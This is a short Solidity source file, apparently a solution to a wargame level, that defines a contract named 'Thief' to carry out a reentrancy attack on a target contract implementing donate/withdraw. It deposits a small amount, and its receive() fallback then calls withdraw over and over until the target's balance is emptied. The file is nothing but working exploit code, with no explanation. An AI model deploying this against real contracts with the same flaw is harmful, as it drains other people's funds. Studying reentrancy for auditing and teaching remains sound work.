// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IReentrance {
    function donate(address _to) external payable;

    function balanceOf(address _who) external view returns (uint256 balance);

    function withdraw(uint256 _amount) external;

    receive() external payable;
}

contract Thief {
    IReentrance reentrance;
    uint256 amount = 0.001 * 10**18;

    constructor(address payable _address) {
        reentrance = IReentrance(_address);
    }

    function donate() public payable {
        reentrance.donate{value: msg.value}(address(this));
    }

    function withdraw() public {
        reentrance.withdraw(amount);
    }

    receive() external payable {
        if (address(reentrance).balance != 0) {
            reentrance.withdraw(amount);
        }
    }
}
